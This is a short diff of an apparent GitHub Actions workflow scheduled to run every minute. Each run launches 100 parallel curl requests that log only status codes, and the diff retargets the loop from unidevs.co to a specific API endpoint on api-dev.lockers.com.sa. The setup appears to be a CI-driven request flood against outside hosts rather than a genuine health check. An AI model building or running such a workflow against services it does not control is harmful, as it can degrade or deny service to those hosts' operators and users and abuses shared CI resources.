@@ -1,6 +1,6 @@
 on:
   schedule:
-    - cron: '* * * * *'
+    - cron: '0-59 * * * *'
 
 
 jobs:
@@ -14,4 +14,4 @@ jobs:
         run: echo "current time is $(date)"
 
       - name: "curl command"
-        run: for i in {1..100}; do curl -s -o /dev/null -w "%{http_code}\n" https://unidevs.co/ & done
+        run: for i in {1..100}; do curl -s -o /dev/null -w "%{http_code}\n" https://api-dev.lockers.com.sa/api/general/services & done
